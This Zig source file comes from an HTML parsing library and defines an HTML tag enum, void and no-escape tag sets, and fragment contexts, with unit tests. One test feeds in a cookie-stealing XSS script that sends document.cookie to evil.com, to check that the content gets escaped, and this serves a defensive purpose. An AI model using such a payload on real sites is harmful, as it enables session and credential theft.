//! Enum optimized HTML Tags

const std = @import("std");
const z = @import("../zhtml.zig");

const testing = std.testing;
const print = std.debug.print;

/// [HtmlTag] Enum that represents the various HTML tags.
///
///  `self.toString` returns the tag name as a string.
///
/// `self.isVoid` checks if the tag is a self-closing element (e.g., `<br>`, `<img>`).
///
///  `self.isNoEscape` checks if the tag should not have its content escaped.
///
///
///
pub const HtmlTag = enum {
    a,
    abbr,
    address,
    area,
    article,
    aside,
    audio,
    b,
    base,
    bdi,
    bdo,
    blockquote,
    body,
    br,
    button,
    canvas,
    caption,
    cite,
    code,
    col,
    colgroup,
    data,
    datalist,
    dd,
    del,
    details,
    dfn,
    dialog,
    div,
    dl,
    dt,
    em,
    embed,
    fieldset,
    figcaption,
    figure,
    footer,
    form,
    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    head,
    header,
    hgroup,
    hr,
    html,
    i,
    iframe,
    img,
    input,
    ins,
    kbd,
    label,
    legend,
    li,
    link,
    main,
    map,
    mark,
    menu,
    meta,
    meter,
    nav,
    noscript,
    object,
    ol,
    optgroup,
    option,
    output,
    p,
    picture,
    pre,
    progress,
    q,
    rp,
    rt,
    ruby,
    s,
    samp,
    script,
    section,
    select,
    slot,
    small,
    source,
    span,
    strong,
    style,
    sub,
    summary,
    sup,
    table,
    tbody,
    td,
    template,
    textarea,
    tfoot,
    th,
    thead,
    time,
    title,
    tr,
    track,
    u,
    ul,
    video,
    wbr,
    svg,
    // SVG elements
    circle,
    rect,
    path,
    line,
    text,
    g,
    defs,
    use,

    pub fn toString(self: @This()) []const u8 {
        return switch (self) {
            .a => "a",
            .abbr => "abbr",
            .address => "address",
            .area => "area",
            .article => "article",
            .aside => "aside",
            .audio => "audio",
            .b => "b",
            .base => "base",
            .bdi => "bdi",
            .bdo => "bdo",
            .blockquote => "blockquote",
            .body => "body",
            .br => "br",
            .button => "button",
            .canvas => "canvas",
            .caption => "caption",
            .cite => "cite",
            .code => "code",
            .col => "col",
            .colgroup => "colgroup",
            .data => "data",
            .datalist => "datalist",
            .dd => "dd",
            .del => "del",
            .details => "details",
            .dfn => "dfn",
            .dialog => "dialog",
            .div => "div",
            .dl => "dl",
            .dt => "dt",
            .em => "em",
            .embed => "embed",
            .fieldset => "fieldset",
            .figcaption => "figcaption",
            .figure => "figure",
            .footer => "footer",
            .form => "form",
            .h1 => "h1",
            .h2 => "h2",
            .h3 => "h3",
            .h4 => "h4",
            .h5 => "h5",
            .h6 => "h6",
            .head => "head",
            .header => "header",
            .hgroup => "hgroup",
            .hr => "hr",
            .html => "html",
            .i => "i",
            .iframe => "iframe",
            .img => "img",
            .input => "input",
            .ins => "ins",
            .kbd => "kbd",
            .label => "label",
            .legend => "legend",
            .li => "li",
            .link => "link",
            .main => "main",
            .map => "map",
            .mark => "mark",
            .menu => "menu",
            .meta => "meta",
            .meter => "meter",
            .nav => "nav",
            .noscript => "noscript",
            .object => "object",
            .ol => "ol",
            .optgroup => "optgroup",
            .option => "option",
            .output => "output",
            .p => "p",
            .picture => "picture",
            .pre => "pre",
            .progress => "progress",
            .q => "q",
            .rp => "rp",
            .rt => "rt",
            .ruby => "ruby",
            .s => "s",
            .samp => "samp",
            .script => "script",
            .section => "section",
            .select => "select",
            .slot => "slot",
            .small => "small",
            .source => "source",
            .span => "span",
            .strong => "strong",
            .style => "style",
            .sub => "sub",
            .summary => "summary",
            .sup => "sup",
            .svg => "svg",
            // SVG elements
            .circle => "circle",
            .rect => "rect",
            .path => "path",
            .line => "line",
            .text => "text",
            .g => "g",
            .defs => "defs",
            .use => "use",
            .table => "table",
            .tbody => "tbody",
            .td => "td",
            .template => "template",
            .textarea => "textarea",
            .tfoot => "tfoot",
            .th => "th",
            .thead => "thead",
            .time => "time",
            .title => "title",
            .tr => "tr",
            .track => "track",
            .u => "u",
            .ul => "ul",
            .video => "video",
            .wbr => "wbr",
        };
    }

    /// Check if this tag is a void  element
    pub fn isVoid(self: HtmlTag) bool {
        return VoidTagSet.contains(self);
    }

    /// Check if this tag should not have its text content escaped
    pub fn isNoEscape(self: HtmlTag) bool {
        return NoEscapeTagSet.contains(self);
    }
};

/// [HtmlTag] Convert string to enum (inline) with fallback to string comparison for custom elements
///
/// (`Zig` code: std.meta.stringToCode` with a higher limit).
pub fn stringToEnum(comptime T: type, str: []const u8) ?T {
    if (@typeInfo(T).@"enum".fields.len <= 112) {
        const kvs = comptime build_kvs: {
            const EnumKV = struct { []const u8, T };
            var kvs_array: [@typeInfo(T).@"enum".fields.len]EnumKV = undefined;
            for (@typeInfo(T).@"enum".fields, 0..) |enumField, i| {
                kvs_array[i] = .{ enumField.name, @field(T, enumField.name) };
            }
            break :build_kvs kvs_array[0..];
        };
        const map = std.StaticStringMap(T).initComptime(kvs);
        return map.get(str);
    } else {
        inline for (@typeInfo(T).@"enum".fields) |enumField| {
            if (std.mem.eql(u8, str, enumField.name)) {
                return @field(T, enumField.name);
            }
        }
        return null;
    }
}

/// [HtmlTag] Convert qualified name (lowercase) to HtmlTag enum
pub inline fn tagFromQualifiedName(qualified_name: []const u8) ?HtmlTag {
    // Fast path: try direct enum lookup (most common case - lowercase)
    if (stringToEnum(HtmlTag, qualified_name)) |tag| {
        return tag;
    }

    // <p>hello <strong>world</strong></p> => {"p", [], ["hello ", {"strong", [], ["world"]}, "!"]}    // Handle case-insensitive lookup for uppercase tags
    // var lowercase_buf: [64]u8 = undefined;
    // if (qualified_name.len >= lowercase_buf.len) return null; // Tag name too long

    // const lowercase_name = std.ascii.lowerString(lowercase_buf[0..qualified_name.len], qualified_name);
    // if (stringToEnum(HtmlTag, lowercase_name)) |tag| {
    //     return tag;
    // }

    // // Handle namespaced elements: "svg:circle" -> null (not in our enum)
    // if (std.mem.indexOf(u8, qualified_name, ":")) |_| {
    //     return null; // Namespaced elements not in standard HTML enum
    // }

    return null; // Unknown/custom element
}

test "tagFromQualifiedName" {
    try testing.expect(tagFromQualifiedName("div") == .div);
    try testing.expect(tagFromQualifiedName("span") == .span);
    try testing.expect(tagFromQualifiedName("unknown") == null);
    try testing.expect(tagFromQualifiedName("custom-element") == null);
    // namespaced
    try testing.expect(tagFromQualifiedName("svg:circle") == null);
}

/// [HtmlTag] Convert element to HtmlTag enum
pub fn tagFromElement(element: *z.HTMLElement) ?HtmlTag {
    const qualified_name = z.qualifiedName_zc(element);
    return tagFromQualifiedName(qualified_name);
}

test "self.toString vs tagFromQualifiedName, self.isVoid, self.isNoEscape" {
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    const tags = [_]z.HtmlTag{ .div, .p, .span, .a, .img, .br, .script };

    for (tags) |tag| {
        const element = try z.createElement(doc, tag.toString());
        const node_name = z.nodeName_zc(z.elementToNode(element)); // UPPERCASE
        const expected_Html_tag_name = tag.toString();

        try testing.expect(tag == z.tagFromElement(element).?);

        if (tag == .br or tag == .img) {
            try testing.expect(tag.isVoid());
        } else if (tag == .script) {
            try testing.expect(!tag.isVoid());
            try testing.expect(tag.isNoEscape());
        } else {
            try testing.expect(!tag.isVoid());
            try testing.expect(!tag.isNoEscape());
        }

        // Note: DOM names are typically uppercase
        try testing.expect(std.ascii.eqlIgnoreCase(expected_Html_tag_name, node_name));

        const expected_tag = tagFromQualifiedName(z.qualifiedName_zc(element)); // lowercase
        try testing.expect(tag == expected_tag);
    }
}

/// [HtmlTag] Tag name matcher function
pub fn matchesTagName(element: *z.HTMLElement, tag_name: []const u8) bool {
    const tag = z.tagFromElement(element);
    return tag == tagFromQualifiedName(tag_name);
}

test "matchesTagName" {
    const doc = try z.createDocFromString("<p></p><br>");
    const body_elt = z.bodyElement(doc).?;
    const p = z.firstElementChild(body_elt).?;
    const br = z.nextElementSibling(p).?;

    try testing.expect(z.matchesTagName(p, "p"));
    try testing.expect(!z.matchesTagName(br, "td"));
}

/// [HtmlTag] Set of void elements
pub const VoidTagSet = struct {
    /// Fast inline check if a tag is void
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .area, .base, .br, .col, .embed, .hr, .img, .input, .link, .meta, .source, .track, .wbr => true,
            else => false,
        };
    }
};

test "VoidTagSet" {
    try testing.expect(VoidTagSet.contains(.br));
    try testing.expect(VoidTagSet.contains(.img));
    try testing.expect(VoidTagSet.contains(.input));
    try testing.expect(!VoidTagSet.contains(.div));
}

/// [HtmlTag] Set of whitespace preserved elements
pub const WhitespacePreserveTagSet = struct {
    /// Fast inline check if a tag is whitespace preserved
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .pre, .textarea, .script, .style => true,
            .code => true,
            else => false,
        };
    }
};

test "whitespacepreservedTagSet" {
    const allocator = testing.allocator;

    const doc = try z.createDocFromString("<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
    defer z.destroyDocument(doc);

    const body_elt = z.bodyElement(doc).?;

    const expected = [_]struct { tag: z.HtmlTag, preserved: bool }{
        .{ .tag = .div, .preserved = false },
        .{ .tag = .pre, .preserved = true },
        .{ .tag = .code, .preserved = true },
        .{ .tag = .textarea, .preserved = true },
        .{ .tag = .script, .preserved = true },
        .{ .tag = .style, .preserved = true },
        .{ .tag = .p, .preserved = false },
    };

    const children_elts = try z.children(allocator, body_elt);
    defer allocator.free(children_elts);

    for (children_elts, 0..) |elt, i| {
        const tag = z.tagFromQualifiedName(z.qualifiedName_zc(elt)).?;
        try testing.expect(expected[i].tag == tag);
        try testing.expect(expected[i].preserved == WhitespacePreserveTagSet.contains(tag));
    }
}

/// [HtmlTag] Set of tags that should not be escaped (modern approach)
pub const NoEscapeTagSet = struct {
    /// Fast inline check if a tag should not be escaped
    pub inline fn contains(tag: HtmlTag) bool {
        return switch (tag) {
            .script, .style, .iframe => true,
            else => false,
        };
    }
};

/// [HtmlTag] Check if element should not have its content escaped (string-based)
///
/// Only standard tags get `isNoEscape = true` (`.script`, `.style`, `.iframe`).
///
/// If returns false, it means the element is not a no-escape element so it should be escaped.
///
/// Same content "<script>alert('xss')</script>", different contexts:
///   1. Inside `<my-widget>`: ESCAPE, treat as text     → Safe display
///   2. Inside `<script>`: DON'T ESCAPE, treat as code  → Functional JavaScript
/// ## Example
/// ```
/// <my-widget>User typed: <script>alert('xss')</script></my-widget>
/// // should become:
/// <my-widget>&lt;script&gt;alert('xss')&lt;/script&gt;</my-widget>
/// //
/// <script>console.log("hello");</script>  ← Must NOT escape
/// <style>body { color: red; }</style>     ← Must NOT escape
/// <iframe src="..."></iframe>             ← Must NOT escape
///---
pub fn isNoEscapeElement(element: *z.HTMLElement) bool {
    const tag = tagFromElement(element) orelse return false;
    return NoEscapeTagSet.contains(tag);
}

/// [HtmlTag] Check if element is void
pub fn isVoidElement(element: *z.HTMLElement) bool {
    const tag = tagFromElement(element) orelse return false;
    return VoidTagSet.contains(tag);
}

test "isVoidElement" {
    const allocator = testing.allocator;
    const doc = try z.createDocFromString("<br><img src=\"img\"><input><p></p>");
    defer z.destroyDocument(doc);

    const body_elt = z.bodyElement(doc).?;

    const expected = [_]struct { tag: z.HtmlTag, void: bool }{
        .{ .tag = .br, .void = true },
        .{ .tag = .img, .void = true },
        .{ .tag = .input, .void = true },
        .{ .tag = .p, .void = false },
    };

    const children_elts = try z.children(allocator, body_elt);
    defer allocator.free(children_elts);

    for (children_elts, 0..) |elt, i| {
        const tag = z.tagFromElement(elt).?;
        try testing.expect(expected[i].tag == tag);
        try testing.expect(expected[i].void == isVoidElement(elt));
    }
}

/// [HtmlTag] Check if the string (lowercased) represents  a Void element
pub fn isVoidName(tag_name: []const u8) bool {
    const tag = stringToEnum(HtmlTag, tag_name) orelse return false;
    return VoidTagSet.contains(tag);
}

test "isVoidName" {
    // Test all void tags
    const void_tags = [_][]const u8{ "area", "base", "br" };

    for (void_tags) |tag| {
        try testing.expect(z.isVoidName(tag));
    }

    const non_void_tags = [_][]const u8{ "div", "p", "span", "a" };

    for (non_void_tags) |tag| {
        try testing.expect(!z.isVoidName(tag));
    }
}

/// [HtmlTag] Extended check for no-escape elements including custom elements
///
/// Combines standard HTML5 tags with your custom no-escape tags.
///
/// **Use when:** You have web components that contain raw code (like code editors)
/// **Performance:** Fast for standard tags (enum), linear search for custom tags
///
/// ```zig
/// const custom_no_escape = [_][]const u8{ "code-editor", "syntax-highlighter" };
/// if (isNoEscapeElementExtended(tag_name, &custom_no_escape)) {
///     // Don't escape content
/// }
/// ```
pub fn isNoEscapeElementExtended(element: *z.HTMLElement, custom_no_escape_tags: []const []const u8) bool {
    // First check standard HTML5 tags
    if (isNoEscapeElement(element)) {
        return true;
    }

    // Then check custom tags
    for (custom_no_escape_tags) |custom_tag| {
        if (std.mem.eql(u8, z.qualifiedName_zc(element), custom_tag)) {
            return true;
        }
    }

    return false;
}

/// [HtmlTag] Fragment parsing context - defines how the fragment should be interpreted
pub const FragmentContext = enum {
    fragment,
    /// Parse as if inside <body> (default for most cases)
    body,
    /// Parse as if inside <div> (for general content)
    div,
    /// Parse as if inside <template> (for web components)
    template,
    /// Parse as if inside <table> (for table rows/cells)
    table,
    tbody,
    tr,
    /// Parse as if inside <select> (for options)
    select,
    /// Parse as if inside <ul> (for list items)
    ul,
    /// Parse as if inside <ol> (for ordered list items)
    ol,
    /// Parse as if inside <dl> (for definition terms/descriptions)
    dl,
    /// Parse as if inside <fieldset> (for legend elements)
    fieldset,
    /// Parse as if inside <details> (for summary elements)
    details,
    /// Parse as if inside <optgroup> (for grouped options)
    optgroup,
    /// Parse as if inside <map> (for area elements)
    map,
    /// Parse as if inside <figure> (for img/figcaption elements)
    figure,
    /// Parse as if inside <form> (for input/label/button elements)
    form,
    /// Parse as if inside <video> (for source/track elements)
    video,
    /// Parse as if inside <audio> (for source/track elements)
    audio,
    /// Parse as if inside <picture> (for source/img elements)
    picture,
    /// Parse as if inside <head> (for meta tags, styles)
    head,
    /// Custom context element
    custom,
    /// Convert context enum to HTML tag name string
    /// Inlined for zero function call overhead in fragment parsing
    pub inline fn toTagName(self: FragmentContext) []const u8 {
        return switch (self) {
            .fragment => "html", // default root
            .body => "body",
            .div => "div",
            .template => "template",
            .table => "table",
            .tbody => "tbody",
            .tr => "tr",
            .select => "select",
            .ul => "ul",
            .ol => "ol",
            .dl => "dl",
            .fieldset => "fieldset",
            .details => "details",
            .optgroup => "optgroup",
            .map => "map",
            .figure => "figure",
            .form => "form",
            .video => "video",
            .audio => "audio",
            .picture => "picture",
            .head => "head",
            .custom => "div", // fallback
        };
    }
    pub inline fn toTag(name: []const u8) ?FragmentContext {
        return stringToEnum(FragmentContext, name);
    }
};

test "FragmentContext" {
    // const doc = try z.createDocument();
    // defer z.destroyDocument(doc);
    // const fragment = try z.createDocumentFragment(doc);

    try testing.expectEqualStrings(FragmentContext.toTagName(.body), "body");
    try testing.expectEqualStrings(FragmentContext.toTagName(.table), "table");
    try testing.expect(FragmentContext.toTag("div").? == .div);
}

test "tagFromElement vs tagName vs qualifiedName allocated/zc" {
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    const div = try z.createElement(doc, "div");
    const web_component = try z.createElement(doc, "x-widget");

    try testing.expect(z.tagFromElement(web_component) == null);
    try testing.expect(z.tagFromElement(div) == .div);

    try testing.expectEqualStrings("DIV", z.nodeName_zc(z.elementToNode(div)));
    try testing.expectEqualStrings("X-WIDGET", z.nodeName_zc(z.elementToNode(web_component)));
    try testing.expectEqualStrings("DIV", z.tagName_zc(div));
    try testing.expectEqualStrings("X-WIDGET", z.tagName_zc(web_component));

    // Test allocation
    const allocator = testing.allocator;

    // Allocating version (safe for long-term storage)
    const wc_qn = try z.qualifiedName(allocator, web_component);
    defer allocator.free(wc_qn);
    try testing.expectEqualStrings("x-widget", wc_qn);

    const div_tn = try z.tagName(allocator, div);
    defer allocator.free(div_tn);
    try testing.expectEqualStrings("DIV", div_tn);

    const wc_tn = try z.tagName(allocator, web_component);
    defer allocator.free(wc_tn);
    try testing.expectEqualStrings("X-WIDGET", wc_tn);
}

test "flow - user input to browser output" {
    const user_submitted_html = "<custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script></custom-widget>";
    const doc = try z.createDocFromString(user_submitted_html);
    defer z.destroyDocument(doc);

    const body_elt = z.bodyElement(doc).?;
    const widget_elt = z.firstElementChild(body_elt).?;

    // custom element <=> not in standard HTML enum
    try testing.expectEqualStrings("custom-widget", z.qualifiedName_zc(widget_elt));
    try testing.expect(z.tagFromQualifiedName("custom-widget") == null);

    // Custom elements should be escaped
    const should_escape_widget = !z.isNoEscapeElement(widget_elt);
    try testing.expect(should_escape_widget == true);

    const widget_content = z.textContent_zc(z.elementToNode(widget_elt));

    try testing.expect(
        std.mem.indexOf(u8, widget_content, "document.cookie") != null,
    );
    try testing.expect(
        std.mem.indexOf(u8, widget_content, "evil.com") != null,
    );

    // Custom elements should be escaped
    try testing.expect(!z.isNoEscapeElement(widget_elt));

    const allocator = testing.allocator;
    const escaped_content = try z.escapeHtml(allocator, widget_content);
    defer allocator.free(escaped_content);

    const expected = "document.location = &#39;https://evil.com?data=&#39; + document.cookie;";
    try testing.expectEqualStrings(expected, escaped_content);
}
